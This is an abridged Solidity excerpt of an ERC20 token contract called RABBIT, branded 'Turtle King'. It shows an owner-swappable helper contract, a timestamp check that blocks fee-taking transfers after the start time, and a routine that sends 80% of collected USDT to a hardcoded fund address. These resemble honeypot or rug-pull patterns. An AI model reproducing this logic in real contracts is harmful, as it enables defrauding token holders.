...
contract RABBIT is ERC20 {
	...
	address _fundAddress = address(0xFCfF6Dc2Dc98102851289b86a8E4AE66Da81A616);
    ...
    constructor(address tokenOwner) ERC20("Turtle King", "Turtle King") {
	...
	function changeSwapWarp(RABBITWarp _warp) public onlyOwner {
        warp = _warp;
    ...
    function _transfer(
        ...
        if (takeFee) {
			require(startTime > block.timestamp,"not start swap");
	...
	function swapAndLiquify() private {
		...
		uint256 swapAmount = haveAmount.div(6).mul(5);
        swapTokensForOther(swapAmount);
        uint256 usdtAmount = USDT.balanceOf(address(this));
		USDT.transfer(_fundAddress,usdtAmount.div(5).mul(4));
        addLiquidityUsdt(usdtAmount.div(5), haveAmount.div(6));
    }
